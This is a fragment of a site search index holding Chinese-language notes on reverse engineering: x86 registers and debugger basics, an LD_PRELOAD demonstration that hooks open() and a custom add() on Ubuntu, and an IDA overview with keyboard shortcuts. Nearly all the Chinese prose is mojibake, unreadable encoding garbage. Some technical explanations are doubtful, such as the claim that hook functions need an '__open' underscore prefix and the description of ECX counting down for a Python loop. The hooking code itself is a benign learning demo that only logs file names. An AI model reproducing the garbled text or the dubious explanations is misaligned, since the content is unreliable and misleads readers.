ä¸çŸ¥é“æºç , åªçŸ¥é“åç¼–è¯‘ä¹‹åçš„æ±‡ç¼–, åˆ©ç”¨æ±‡ç¼–è°ƒè¯•å·¥å…·è¿›è¡Œè°ƒè¯• ä¸€èˆ¬åˆ†ä¸º ç”¨æˆ·æ¨¡å¼: ä»¥ç”¨æˆ·çš„èº«ä»½; ç›¸å…³å·¥å…·: WinDbg(å¾®è½¯ç”Ÿäº§), OllyDbg(å…è´¹ç¨‹åº), gdb; PyDbg; Immunity Debugger(ç•Œé¢å‹å¥½, ç±»ä¼¼OllyDbg) å†…æ ¸æ¨¡å¼: ä¸åº•å±‚äº¤äº’ X86å…«ä¸ªé€šç”¨å¯„å­˜å™¨(å…·ä½“è¯´æ˜å¯å‚è€ƒ: /docs/å®‰å…¨/é€†å‘å·¥ç¨‹/æ±‡ç¼– ): EAX, EDX, ECX, ESI, EDI, EBP, ESP å’Œ EBX å¯„å­˜å™¨è¯´æ˜ EAX å¯„å­˜å™¨(Extended Accumulator, æ‰©å±•ç´¯åŠ å™¨) ä¹Ÿå«åš ç´¯åŠ å¯„å­˜å™¨ ï¼Œé™¤äº†ç”¨äºå­˜å‚¨å‡½æ•°çš„è¿”å›å€¼å¤–ä¹Ÿç”¨äºæ‰§è¡Œè®¡ç®—çš„æ“ä½œã€‚ è®¸å¤šä¼˜åŒ–çš„ x86æŒ‡ä»¤é›†éƒ½ä¸“é—¨è®¾è®¡äº†é’ˆå¯¹ EAX å¯„å­˜å™¨çš„è¯»å†™å’Œè®¡ç®—æŒ‡ä»¤ã€‚ åˆ—å¦‚ä»æœ€åŸºæœ¬çš„åŠ å‡ï¼Œæ¯”è¾ƒåˆ°ç‰¹æ®Šçš„ä¹˜é™¤æ“ä½œéƒ½æœ‰ä¸“é—¨çš„EAXä¼˜åŒ–æŒ‡ä»¤ã€‚ å‰é¢æˆ‘ä»¬è¯´äº†ï¼Œå‡½æ•°çš„è¿”å›å€¼ä¹Ÿæ˜¯å­˜å‚¨åœ¨EAXå¯„å­˜å™¨é‡Œã€‚ è¿™ä¸€ç‚¹å¾ˆé‡è¦ï¼Œå› ä¸ºé€šè¿‡è¿”å›çš„EAX é‡Œçš„å€¼æˆ‘ä»¬å¯ä»¥åˆ¤æ–­å‡½æ•°æ˜¯æ‰§è¡ŒæˆåŠŸä¸å¦ï¼Œæˆ–è€…å¾—åˆ°ç¡®åˆ‡è¿”å›å€¼ã€‚ EDX å¯„å­˜å™¨ (Extended Data, æ‰©å±•æ•°æ®) ä¹Ÿå«åšæ•°æ®å¯„å­˜å™¨ã€‚è¿™ä¸ªå¯„å­˜å™¨ä»æœ¬è´¨ä¸Šæ¥è¯´æ˜¯EAX å¯„å­˜å™¨çš„å»¶ä¼¸ï¼Œ å®ƒè¾…åŠ© EAXå®Œæˆæ›´å¤šå¤æ‚çš„è®¡ç®—æ“ä½œåƒä¹˜æ³•å’Œé™¤æ³•ã€‚ å®ƒè™½ç„¶ä¹Ÿèƒ½å½“ä½œé€šç”¨å¯„å­˜å™¨ä½¿ç”¨ï¼Œä¸è¿‡æ›´å¤šçš„æ˜¯ç»“åˆEAX å¯„å­˜å™¨è¿›è¡Œè®¡ç®—æ“ä½œã€‚ ECXå¯„å­˜å™¨(Extended Counter, æ‰©å±•è®¡æ•°å™¨) ä¹Ÿå«åšè®¡æ•°å¯„å­˜å™¨ï¼Œç”¨äºå¾ªç¯æ“ä½œï¼Œæ¯”å¦‚é‡å¤çš„å­—ç¬¦å­˜å‚¨æ“ä½œï¼Œæˆ–è€…æ•°å­—ç»Ÿè®¡ã€‚ æœ‰ä¸€ç‚¹å¾ˆé‡è¦ï¼ŒECXå¯„å­˜å™¨çš„è®¡ç®—æ˜¯å‘ä¸‹è€Œä¸æ˜¯å‘ä¸Šçš„ï¼ˆç®€å•ç†è§£å°±æ˜¯ç”¨äºå¾ªç¯æ“ä½œæ—¶æ˜¯ç”±å¤§å‡åˆ°å°çš„ï¼‰ã€‚ å¦‚ä¸€ä¸‹Pythonç‰‡æ®µ: counter = 0 while counter < 10: print(counter) counter += 1 å¦‚æœä½ æŠŠè¿™ä»£ç è½¬åŒ–æˆæ±‡ç¼–ä»£ç ï¼Œä½ ä¼šçœ‹åˆ°ç¬¬ä¸€è½®çš„æ—¶å€™ECX å°†ç­‰äº 10ï¼Œ ç¬¬äºŒè½®çš„æ—¶å€™ç­‰äº9ï¼Œå¦‚æ­¤åå¤çŸ¥é“ECX å‡å°‘åˆ°0ã€‚ è¿™å¾ˆå®¹æ˜“è®©äººå›°æƒ‘ï¼Œå› è¿™å’Œ Python çš„å¾ªç¯åˆšå¥½ä»£ç ç›¸åï¼Œä½†æ˜¯åªè¦è®°å¾—ECX æ˜¯å‘ä¸‹è®¡ç®—çš„å°±è¡Œäº†ã€‚ åœ¨x86æ±‡ç¼–é‡Œï¼Œä¾é  ESI å’Œ EDI å¯„å­˜å™¨èƒ½å¯¹éœ€è¦å¾ªç¯æ“ä½œçš„æ•°æ®è¿›è¡Œé«˜æ•ˆçš„å¤„ç†ã€‚ ESI å¯„å­˜å™¨(Extended Source Index, æ‰©å±•æºç´¢å¼•) æ˜¯æºæ“ä½œæ•°æŒ‡é’ˆï¼Œå­˜å‚¨ç€è¾“å…¥çš„æ•°æ®æµçš„ä½ç½®ã€‚ ESI ï¼ˆsource indexï¼‰ç”¨äºè¯» EDI å¯„å­˜å™¨(Extended Destination Index, æ‰©å±•ç›®æ ‡ç´¢å¼•) æ˜¯ç›®çš„æ“ä½œæ•°æŒ‡é’ˆï¼Œå­˜å‚¨äº†è®¡ç®—ç»“æœå­˜å‚¨çš„ä½ç½®ã€‚ EDI ï¼ˆdestination indexï¼‰ç”¨äºå†™ã€‚ ç”¨æºæ“ä½œæ•°æŒ‡é’ˆå’Œç›®çš„æ“ä½œæ•°æŒ‡é’ˆï¼Œæå¤§çš„æé«˜äº†ç¨‹åºå¤„ç†æ•°æ®çš„æ•ˆç‡ã€‚ ESP(Extended Stack Pointer, æ‰©å±•å †æ ˆæŒ‡é’ˆ) å’Œ EBP(Extended Base Pointer, æ‰©å±•åŸºå€æŒ‡é’ˆ) åˆ†åˆ«æ˜¯æ ˆæŒ‡é’ˆå’ŒåŸºæŒ‡é’ˆ. è¿™ä¸¤ä¸ªå¯„å­˜å™¨å…±åŒè´Ÿè´£å‡½æ•°çš„è°ƒç”¨å’Œæ ˆçš„æ“ä½œã€‚ å½“ä¸€ä¸ªå‡½æ•°è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œå‡½æ•°éœ€è¦çš„å‚æ•°è¢«é™†ç»­å‹è¿›æ ˆå†…æœ€åå‡½æ•°çš„è¿”å›åœ°å€ä¹Ÿè¢«å‹è¿›ã€‚ ESPæŒ‡ç€æ ˆé¡¶ï¼Œä¹Ÿå°±æ˜¯è¿”å›åœ°å€ã€‚ EBP åˆ™æŒ‡ç€æ ˆçš„åº•ç«¯ã€‚æœ‰æ—¶å€™ï¼Œç¼–è¯‘å™¨èƒ½å¤Ÿåšå‡ºä¼˜åŒ–ï¼Œé‡Šæ”¾EBPï¼Œä½¿å…¶ä¸å†ç”¨äºæ ˆçš„æ“ä½œï¼Œåªä½œä¸ºæ™®é€šçš„å¯„å­˜å™¨ä½¿ç”¨ã€‚ EBX(Extended Base, æ‰©å±•åŸºå€) å”¯ä¸€ä¸€ä¸ªæ²¡æœ‰ç‰¹ç”¨é€”çš„å¯„å­˜å™¨ã€‚å®ƒèƒ½å¤Ÿä½œé¢å¤–çš„æ•°æ®å‚¨å­˜å™¨ã€‚ EIP(Extended Instruction Pointer, æ‰©å±•æŒ‡ä»¤æŒ‡é’ˆ) æ€»æ˜¯æŒ‡å‘é©¬ä¸Šè¦æ‰§è¡Œçš„æŒ‡ä»¤ã€‚ å½“CPUæ‰§è¡Œä¸€ä¸ªç¨‹åºçš„æˆåƒä¸Šä¸‡çš„ä»£ç çš„æ—¶å€™ï¼ŒEIP ä¼šå®æ—¶çš„æŒ‡å‘å½“å‰CPUé©¬ä¸Šè¦æ‰§è¡Œåˆ°çš„ä½ç½®ã€‚ ä¸€ä¸ªè°ƒè¯•å™¨å¿…é¡»èƒ½å¤Ÿå¾ˆæ–¹ä¾¿çš„è·å–å’Œä¿®æ”¹è¿™äº›å¯„å­˜å™¨çš„å†…å®¹ã€‚ æ¯ä¸€ä¸ªæ“ä½œç³»ç»Ÿéƒ½æä¾›äº†ä¸€ä¸ªæ¥å£è®©è°ƒè¯•å™¨å’Œ CPU äº¤äº’ï¼Œä»¥ä¾¿èƒ½å¤Ÿè·å–å’Œä¿®æ”¹è¿™äº›å€¼ã€‚ æ³¨è§£ a(Accumulator), 8ä½ç´¯åŠ å™¨ã€‚8080ã€‚b åŸºå€ï¼Œc è®¡æ•°ï¼Œdæ•°æ® ax(Accumulator)ï¼Œ16ä½ç´¯åŠ å™¨ï¼Œç”±ahï¼Œal ç»„æˆã€‚8086ã€‚bx=bh+bl,cx=ch+cl,dx=dh+dl eax(Extended Accumulator)ï¼Œ32ä½ç´¯åŠ å™¨ï¼Œ80386 rax(Return Accumulator)ï¼Œ64ä½ç´¯åŠ å™¨ã€‚X86-64 å…³äºXçš„è§£é‡Š: æœ€æ—©çš„x86çš„ç´¯åŠ å¯„å­˜å™¨å«ax, é«˜ä½ç‚ºah, ä½ä½ç‚ºal, æ‹¼åœ¨ä¸€èµ·å«ax. IA-32æ™‚ä»£ä»¥åå«eax, æ“´å±•(extend)ç‚º32ä½, é€™å€‹eå°±æ˜¯extend, aæ˜¯accumulate, xå…¶å¯¦æ˜¯håŠ lçš„æ„æ€, æ²’ç‰¹åˆ¥æ„ç¾© å‚è€ƒ: http://bbs.chinaunix.net/thread-2315852-1-1.html æ ˆ æœºå™¨æ‰§è¡Œè®¡ç®—æ˜¯é€šè¿‡æ ˆè¿›è¡Œæ“ä½œçš„, ESP æ€»æ˜¯æŒ‡å‘æ ˆé¡¶, EBP æŒ‡å‘æ ˆåŸºå€ æ ˆä»å†…å­˜é«˜åœ°å€å‘ä½åœ°å€å¢é•¿ æ–­ç‚¹ è½¯ä»¶æ–­ç‚¹: INT3 ä¸­æ–­ ç¡¬ä»¶æ–­ç‚¹: INT1 ä¸­æ–­ å†…å­˜æ–­ç‚¹: åˆ©ç”¨ä¿æŠ¤é¡µ(å¯è¯», å¯å†™, å¯æ‰§è¡Œé¡µ) å®ç°ä¸€ä¸ªWindowsè°ƒè¯•å™¨ è¿›ç¨‹å¯åŠ¨æ–¹å¼(ä¸¤ç§) ç”±è°ƒè¯•å™¨å¯åŠ¨è¿›ç¨‹ è°ƒè¯•å™¨é™„åŠ åˆ°è¿›ç¨‹ ç›¸å…³Win32API: å¯åŠ¨è¿›ç¨‹: BOOL WINAPI Create ProcessA( LPCSTR IpApplicationName, LPTSTR IpCommandLine, LPSECURITY_ATTRIBUTES IpProcessAttributes, LPSECURITY_ATTRIBUTES IpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID IpEnvironment, LPCTSTR IpCurrentDirectory, LPSTARTUPINFO IpStartupInfo, LPPROCESS_INFORMATION IpProcessInformation ) é™„åŠ åˆ°è¿›ç¨‹å‰çš„æ‰“å¼€è¿›ç¨‹å¥æŸ„: HANDLE WINAPI OpenProcess( DWORD dwDesiredAccess, BOOL bInheritHandle DWORD dwProcessId ) é™„åŠ åˆ°è¿›ç¨‹: BOOL WINAPI DebugActiveProcess( DWORD dwProcessId )","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Python-gray-hat.html","loc":"/yq-doc-source-docs-Safety-Python-gray-hat.html"},{"title":"å®æˆ˜-Ubuntu16ä¸‹Hookç³»ç»Ÿçš„open","text":"å› ä¸ºä¸Šä¸€ç¯‡çš„ /docs/å®‰å…¨/é€†å‘å·¥ç¨‹/å®æˆ˜-Macä¸‹Hookå…¶ä»–è¿›ç¨‹ å¤±è´¥äº†, ç„¶åæ‰¾åŸå› å•Š, å·´æ‹‰å·´æ‹‰çš„, å°±æœ‰äº†è¿™ä¸ª Hookæ ‡å‡†åº“çš„open æ³¨è§£ æ­¤ç¯‡å¹…æœ¬ä¹Ÿæ˜¯æƒ³ç”¨addçš„, ä½†æ˜¯ä¼°è®¡æ˜¯åŠ¨æ€åº“çš„ä½¿ç”¨æ–¹å¼ä¸å¯¹, æ‰€ä»¥æœ€ç»ˆè¿˜æ˜¯æ¢æˆäº†ç³»ç»Ÿçš„åŠ¨æ€åº“é‡Œé¢çš„openè°ƒç”¨ ä¸‹æ–¹æºç ä¸»è¦çœ‹open, addåé¢å†çœ‹å•¥é—®é¢˜ test3.cæºç : #include <stdio.h> #include <unistd.h> #include <fcntl.h> #include <sys/types.h> #include <sys/stat.h> int add(int a, int b){ return a+b+3; } int main(){ int a = 200; int b = 300; int ret = add(a, b); printf(\"a + b = %d + %d = %d\\n\", a, b, ret); int fd = open(\"test3.c\", O_RDONLY) ; if (fd != -1){ printf(\"open t3 success\\n\"); } else { printf(\"open t3 failed\\n\"); } close(fd); return 0; } ç¼–è¯‘ä¸ºæ‰§è¡Œæ–‡ä»¶: gcc -g -o test3 test3.c ç„¶åæ˜¯hookçš„ä»£ç hookt3.c: #include \"stdio.h\" int add(int a, int b){ printf(\"===hook in====\"); int ret = a + b + 100; printf(\"===hook out===\"); return ret; } extern int __open(char *,int,int); //æ‰“å¼€æ–‡ä»¶ int open(char * path,int flags,int mode) { //è¾“å‡ºæ‰“å¼€çš„æ–‡ä»¶å printf(\"=======hook open :%s\\n\",path); int ret = __open(path,flags,mode); printf(\"===hoot fd: %d \\n\", ret); return ret; // return 0; } ç¼–è¯‘ä¸ºåŠ¨æ€åº“: gcc -shared -fPIC -g -o libhkt2.so hookt3.c å•ç‹¬æ‰§è¡Œ: $ ./test3 a + b = 200 + 300 = 503 open t3 success åŠ hookåº“: $ LD_PRELOAD=./libhkt2.so ./test3 a + b = 200 + 300 = 503 =======hook open :test3.c ===hoot fd: 3 open t3 success lddå¯¹æ¯”ä¸‹åŠ è½½åº“é¡ºåº: root@740ff0ad5041:~/project/test# ldd test3 linux-vdso.so.1 => (0x00007fff657c8000) libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5d2fd2a000) /lib64/ld-linux-x86-64.so.2 (0x00007f5d300f4000) åšäº† LD_PRELOAD çš„: root@740ff0ad5041:~/project/test# LD_PRELOAD=./libhkt2.so ldd test3 =======hook open :/dev/tty ===hoot fd: 3 =======hook open :/usr/bin/ldd ===hoot fd: 3 linux-vdso.so.1 => (0x00007ffebd48a000) ./libhkt2.so (0x00007f9b745a3000) libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9b741d9000) /lib64/ld-linux-x86-64.so.2 (0x00007f9b747a5000) root@740ff0ad5041:~/project/test# ä¸ºä»€ä¹ˆopenè¦ä½¿ç”¨åŒä¸‹åˆ’çº¿å‰ç¼€ ä½¿ç”¨__openå¯¹åº•å±‚openå‡½æ•°è¿›è¡Œhook,ä¸ºä»€ä¹ˆå®šä¹‰çš„å‡½æ•°åŸå‹æ˜¯: extern int __open(char *,int,int); åŸå› æ˜¯: åœ¨GNU/Linuxç³»ç»Ÿä¸­,ç³»ç»Ÿè°ƒç”¨å’Œåº“å‡½æ•°çš„åç§°å¸¦æœ‰å‰ç¼€æ¥åŒºåˆ†ã€‚ å¯¹åº”openç³»ç»Ÿè°ƒç”¨çš„åº“å‡½æ•°åç§°æ˜¯__openã€‚ å¦‚æœç›´æ¥ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨çš„ API,å¦‚ open()ã€write() ç­‰,å®šä¹‰å’Œè°ƒç”¨æ—¶ä½¿ç”¨çš„æ˜¯æ²¡æœ‰ä¸‹åˆ’çº¿å‰ç¼€çš„åç§°,å¦‚ open()ã€‚ ä½†æ˜¯å¦‚æœè¦å¯¹ç³»ç»Ÿè°ƒç”¨åš hook,é‚£ä¹ˆ hook å‡½æ•°çš„å®šä¹‰éœ€è¦ä½¿ç”¨ä¸‹åˆ’çº¿å‰ç¼€éšè—åç§°,å¦‚ __open()ã€‚ æ ‡å‡†åº“å‡½æ•°å¦‚ strcpy()ã€printf() ç­‰,ç›´æ¥ä½¿ç”¨å’Œå®šä¹‰æ—¶ä¹Ÿæ˜¯æ²¡æœ‰ä¸‹åˆ’çº¿å‰ç¼€ã€‚ åªæœ‰åœ¨éœ€è¦è¿›è¡Œ hook æ ‡å‡†åº“å‡½æ•°æ—¶,hook å‡½æ•°æ‰ä½¿ç”¨ä¸‹åˆ’çº¿å‰ç¼€éšè—åç§°,å¦‚ __strcpy() ç­‰ã€‚ Hookæ ‡å‡†åº“çš„è‡ªå®šä¹‰çš„add ç»è¿‡ä¸æ‡ˆåŠªåŠ›, ç»ˆäºåœ¨linuxä¸ŠæˆåŠŸäº†, ä¹‹å‰ç¼–è¯‘é¡ºåºé—®é¢˜å¯¼è‡´ä¸€ç›´å¤±è´¥ ub16æ­£ç¡®ç¼–è¯‘å¸¦åº“çš„æ‰§è¡Œæ–‡ä»¶: gcc -o test3 test3.c -luadd -L./ -g æ¢ä¸ªé¡ºåºå°±æ˜¯é”™çš„: // error, æ‰¾ä¸åˆ°add gcc -luadd -L./ -g -o test3 test3.c è‡ªå®šä¹‰ä¸€ä¸ªåŠ¨æ€åº“, å®ç°addå‡½æ•° add.h: int add(int a, int b); add.c: #include \"add.h\" int add(int a, int b){ return a+b+300; } å°†addç¼–è¯‘ä¸ºuaddåº“: gcc -shared -fPIC -g -o libuadd.so add.c å…¥å£æ‰§è¡Œæ–‡ä»¶test3.c: #include <stdio.h> #include <unistd.h> #include <fcntl.h> #include <sys/types.h> #include <sys/stat.h> #include \"add.h\" int main(){ int a = 200; int b = 300; int ret = add(a, b); printf(\"a + b = %d + %d = %d\\n\", a, b, ret); int fd = open(\"test3.c\", O_RDONLY) ; if (fd != -1){ printf(\"open t3 success\\n\"); } else { printf(\"open t3 failed\\n\"); } close(fd); return 0; } // linuxä¸‹ -o test3 test3.c å¾—åœ¨æœ€å‰é¢, ä¸ç„¶æ‰¾ä¸åˆ°add // gcc -o test3 test3.c -luadd -L./ -g // gcc -g -o test3 test3.c ç¼–è¯‘ä¸ºæ‰§è¡Œæ–‡ä»¶: gcc -o test3 test3.c -luadd -L./ -g hookçš„åº“æºç hookt3.c: #include <stdio.h> int add(int a, int b){ printf(\"===hook in add====\\n\"); int ret = a + b + 100; printf(\"===hook out add===\\n\"); return ret; } extern int __open(char *,int,int); //æ‰“å¼€æ–‡ä»¶ int open(char * path,int flags,int mode) { //è¾“å‡ºæ‰“å¼€çš„æ–‡ä»¶å printf(\"=======hook open :%s\\n\",path); int ret = __open(path,flags,mode); printf(\"===hoot fd: %d \\n\", ret); return ret; // return 0; } // gcc -shared -fPIC -g -o libhkt2.so hookt3.c // LD_LIBRARY_PATH=./ LD_PRELOAD=./libhkt2.so ./test3 ç¼–è¯‘ä¸ºåŠ¨æ€åº“hkt2: gcc -shared -fPIC -g -o libhkt2.so hookt3.c ç°åœ¨å¯ä»¥æ¥æµ‹è¯•äº†, å½“ä¸æ’å…¥hookåŠ¨æ€åº“æ—¶å€™: $ LD_LIBRARY_PATH=./ ./test3 a + b = 200 + 300 = 800 open t3 success æ³¨è§£ æ­¤å¤„ä½¿ç”¨ LD_LIBRARY_PATH æ˜¯å› ä¸º, è°ƒç”¨äº†å½“å‰è‡ªå·±ç¼–çš„åŠ¨æ€åº“, è¿™æ ·æ‰èƒ½æ‰¾åˆ° ä¸è¿™æ ·çš„è¯, è¦ä¹ˆå†™åˆ°ç³»ç»Ÿåº“è·¯å¾„å», è¦ä¹ˆé‡å†™ä¸‹ldconf å½“æ’å…¥hookæ—¶: $ LD_LIBRARY_PATH=./ LD_PRELOAD=./libhkt2.so ./test3 ===hook in add==== ===hook out add=== a + b = 200 + 300 = 600 =======hook open :test3.c ===hoot fd: 3 open t3 success é‡è¦ LD_PRELOAD åªæ˜¯é¢„åŠ è½½åŠ¨æ€åº“çš„, å¦‚æœaddç›´æ¥æ˜¯æºç å†™åœ¨äº†æ‰§è¡Œæ–‡ä»¶, æˆ–è€…addåœ¨é™æ€åº“, é‚£ä¹ˆè¿™ç§æ–¹æ³•å°±ä¸è¡Œäº†","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Reverse-Engineering-Actual-combat-Open-of-the-HOOK-system-under-the-HOOK-system-under16.html","loc":"/yq-doc-source-docs-Safety-Reverse-Engineering-Actual-combat-Open-of-the-HOOK-system-under-the-HOOK-system-under16.html"},{"title":"IDAå·¥å…·","text":"IDAæ˜¯ä¸€æ¬¾å¼ºå¤§çš„åç¼–è¯‘å·¥å…·, æ”¯æŒè·¨å¹³å° å®˜ç½‘: https://hex-rays.com/ida-free/#download IDAå…¨ç§°æ˜¯äº¤äº’å¼åæ±‡ç¼–å™¨ä¸“ä¸šç‰ˆï¼ˆInteractive Disassembler Professionalï¼‰ï¼Œäººä»¬å…¶ç®€ç§°ä¸ºIDAï¼Œ æ˜¯ç›®å‰æœ€æ£’çš„ä¸€ä¸ªé™æ€åç¼–è¯‘è½¯ä»¶ï¼Œä¸ºä¼—å¤š0dayä¸–ç•Œçš„æˆå‘˜å’ŒShellCodeå®‰å…¨åˆ†æäººå£«ä¸å¯ç¼ºå°‘çš„åˆ©å™¨ï¼ IDA Proæ˜¯ä¸€æ¬¾äº¤äº’å¼çš„ï¼Œå¯ç¼–ç¨‹çš„ï¼Œå¯æ‰©å±•çš„ï¼Œå¤šå¤„ç†å™¨çš„ï¼Œäº¤å‰Windowsæˆ–Linux WinCE MacOSå¹³å°ä¸»æœºæ¥åˆ†æç¨‹åºï¼Œ è¢«å…¬è®¤ä¸ºæœ€å¥½çš„èŠ±é’±å¯ä»¥ä¹°åˆ°çš„é€†å‘å·¥ç¨‹åˆ©å™¨ã€‚IDA Proå·²ç»æˆä¸ºäº‹å®ä¸Šçš„åˆ†ææ•Œæ„ä»£ç çš„æ ‡å‡†å¹¶è®©å…¶è‡ªèº«è¿…é€Ÿæˆä¸ºæ”»å‡»ç ”ç©¶é¢†åŸŸçš„é‡è¦å·¥å…·ã€‚ å®ƒæ”¯æŒæ•°åç§CPUæŒ‡ä»¤é›†å…¶ä¸­åŒ…æ‹¬Intel x86ï¼Œx64ï¼ŒMIPSï¼ŒPowerPCï¼ŒARMï¼ŒZ80ï¼Œ68000ï¼Œc8051ç­‰ç­‰ã€‚ IDAï¼ˆInteractive Disassemblerï¼‰æ˜¯ä¸€æ¬¾å¼ºå¤§çš„é€†å‘å·¥ç¨‹å·¥å…·ï¼Œ ç”¨äºåˆ†æå’Œé€†å‘ç¼–è¯‘äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå¦‚å¯æ‰§è¡Œæ–‡ä»¶ã€åŠ¨æ€é“¾æ¥åº“ç­‰ï¼‰ã€‚ å®ƒæä¾›äº†å¹¿æ³›çš„åŠŸèƒ½å’Œç‰¹æ€§ï¼Œä½¿é€†å‘å·¥ç¨‹å¸ˆèƒ½å¤Ÿæ·±å…¥ç ”ç©¶å’Œç†è§£äºŒè¿›åˆ¶æ–‡ä»¶çš„ç»“æ„ã€é€»è¾‘å’ŒåŠŸèƒ½ã€‚ ä»¥ä¸‹æ˜¯ä¸€äº›IDAçš„ä¸»è¦ç‰¹ç‚¹å’ŒåŠŸèƒ½ï¼š åæ±‡ç¼–å’Œåˆ†æï¼šIDAèƒ½å¤Ÿå°†äºŒè¿›åˆ¶æ–‡ä»¶åæ±‡ç¼–ä¸ºå¯è¯»çš„æ±‡ç¼–ä»£ç ï¼Œ ä½¿ç”¨æˆ·èƒ½å¤ŸæŸ¥çœ‹å’Œç†è§£ç¨‹åºçš„åº•å±‚æŒ‡ä»¤å’Œæ“ä½œã€‚ å®ƒå¯ä»¥å¯¹ç¨‹åºè¿›è¡Œé™æ€åˆ†æï¼Œæå–å‡½æ•°ã€å˜é‡ã€æ§åˆ¶æµå›¾ç­‰ä¿¡æ¯ï¼Œå¹¶æä¾›é«˜çº§çš„å›¾å½¢åŒ–ç•Œé¢æ¥å±•ç¤ºåˆ†æç»“æœã€‚ äº¤äº’å¼è°ƒè¯•ï¼šIDAå…·æœ‰å†…ç½®çš„è°ƒè¯•åŠŸèƒ½ï¼Œå¯ä»¥ä¸è°ƒè¯•å™¨é›†æˆï¼Œ å…è®¸ç”¨æˆ·åœ¨é€†å‘åˆ†æè¿‡ç¨‹ä¸­è·Ÿè¸ªå’Œè°ƒè¯•äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ å®ƒæ”¯æŒæ–­ç‚¹è®¾ç½®ã€å•æ­¥æ‰§è¡Œã€å¯„å­˜å™¨å’Œå†…å­˜æŸ¥çœ‹ç­‰è°ƒè¯•æ“ä½œï¼Œå¸®åŠ©ç”¨æˆ·ç†è§£ç¨‹åºçš„æ‰§è¡Œè¿‡ç¨‹å’ŒçŠ¶æ€ã€‚ å¯æ‰©å±•æ€§ï¼šIDAæ”¯æŒæ’ä»¶å’Œè„šæœ¬ï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿæ ¹æ®è‡ªå·±çš„éœ€æ±‚å®šåˆ¶å’Œæ‰©å±•å·¥å…·çš„åŠŸèƒ½ã€‚ ç”¨æˆ·å¯ä»¥ç¼–å†™è„šæœ¬æ¥è‡ªåŠ¨åŒ–åˆ†æä»»åŠ¡ã€æ‰§è¡Œè‡ªå®šä¹‰çš„åˆ†æç®—æ³•æˆ–æ·»åŠ æ–°çš„åŠŸèƒ½æ¨¡å—ã€‚ æ”¯æŒå¤šç§å¹³å°å’Œæ–‡ä»¶æ ¼å¼ï¼šIDAå¯ä»¥å¤„ç†å¤šç§ä¸åŒçš„äºŒè¿›åˆ¶æ–‡ä»¶æ ¼å¼å’Œå¤„ç†å™¨æ¶æ„ï¼Œ åŒ…æ‹¬x86ã€ARMã€MIPSç­‰ã€‚å®ƒè¿˜æ”¯æŒå¤šä¸ªæ“ä½œç³»ç»Ÿï¼ŒåŒ…æ‹¬Windowsã€Linuxã€macOSç­‰ã€‚ IDAåœ¨é€†å‘å·¥ç¨‹ã€æ¶æ„ä»£ç åˆ†æã€æ¼æ´ç ”ç©¶ç­‰é¢†åŸŸè¢«å¹¿æ³›ä½¿ç”¨ã€‚ å®ƒä¸ºé€†å‘å·¥ç¨‹å¸ˆæä¾›äº†å¼ºå¤§çš„å·¥å…·å’ŒåŠŸèƒ½ï¼Œä»¥å¸®åŠ©ä»–ä»¬æ·±å…¥ç ”ç©¶å’Œåˆ†æäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œ ç†è§£ç¨‹åºçš„å†…éƒ¨å·¥ä½œåŸç†ï¼Œå¹¶å‘ç°å…¶ä¸­çš„æ½œåœ¨é—®é¢˜å’Œæ¼æ´ã€‚ å…¥é—¨æ•™ç¨‹: https://blog.csdn.net/qq_47403671/article/details/119939585 å¸ƒå±€ å·¦ä¾§çª—å£ä¸ºå‡½æ•°åˆ—è¡¨çª—å£ å³ä¾§çª—å£ä¸ºIDAåæ±‡ç¼–æ‰€å¾—çš„æ±‡ç¼–ä»£ç  æœ€ä¸‹ä¾§çª—å£ä¸ºæ–‡ä»¶åœ¨åæ±‡ç¼–è¿‡ç¨‹ä¸­çš„ä¿¡æ¯ã€‚ èœå• Fileï¼šç”¨äºæ‰“å¼€ã€æ–°å»ºã€è£…è½½ã€ä¿å­˜ã€å…³é—­ä¸€ä¸ªæ–‡ä»¶æˆ–æ˜¯æ•°æ®åº“ Editï¼šç”¨äºç¼–è¾‘åæ±‡ç¼–ä»£ç  Jumpï¼šç”¨äºè·³è½¬åˆ°æŸä¸ªä½ç½®ã€åœ°å€æˆ–æ˜¯ä¸€ä¸ªçª—å£ Searchï¼šç”¨äºæœç´¢ä»£ç æ®µã€æ•°æ®ã€é”™è¯¯ç­‰ç­‰ Viewï¼šç”¨äºæ˜¾ç¤ºæ–‡ä»¶å†…å®¹çš„æ˜¾ç¤ºæ–¹å¼ Debuggerï¼šè°ƒè¯•å™¨ï¼Œé›†æˆåœ¨IDAä¸­ Luminaï¼šå¯¹å…ƒæ•°æ®è¿›è¡Œå„ç§æ“ä½œ Optionsï¼šå¯ä»¥è¿›è¡Œä¸€äº›ä¸ªæ€§åŒ–çš„è®¾ç½® å¿«æ·é”® Ctrl+Enter å‰è¿› Esc åé€€ space(ç©ºæ ¼) åˆ‡æ¢è§†å›¾æ ¼å¼æˆ–è€…ä»£ç æ ¼å¼ A æ˜¾ç¤ºç¡¬ç¼–ç -ä»¥å­—ç¬¦ä¸²æ˜¾ç¤º C æ˜¾ç¤ºç¡¬ç¼–ç -ä»¥codeå½¢å¼æ˜¾ç¤º D æ˜¾ç¤ºç¡¬ç¼–ç -ä»¥æ•°æ®å½¢å¼æ˜¾ç¤º, æŒ‰ä¸€æ¬¡è¡¨ç¤º1ä¸ªå­—èŠ‚, 2æ¬¡è¡¨ç¤ºä¸¤ä¸ªå­—èŠ‚(dw), 3æ¬¡è¡¨ç¤º4å­—èŠ‚ U æ˜¾ç¤ºç¡¬ç¼–ç -undefined (ä»¥åŸå§‹å­—èŠ‚æ˜¾ç¤º) G è·³è½¬åˆ°ç»™å®šçš„åœ°å€ ALT + T æœç´¢ CTRL + T å†æ¬¡æœç´¢ N æ›´æ”¹å˜é‡çš„åç§° P åˆ›å»ºå‡½æ•° ALT + Q ä¿®æ”¹ä¸ºæŒ‡å®šçš„ç»“æ„ä½“ç±»å‹ (å…¨å±€å˜é‡) T ä¿®æ”¹ä¸ºæŒ‡å®šçš„ç»“æ„ä½“ç±»å‹ (å±€éƒ¨å˜é‡) ; (åˆ†å·) å†™æ³¨é‡Š 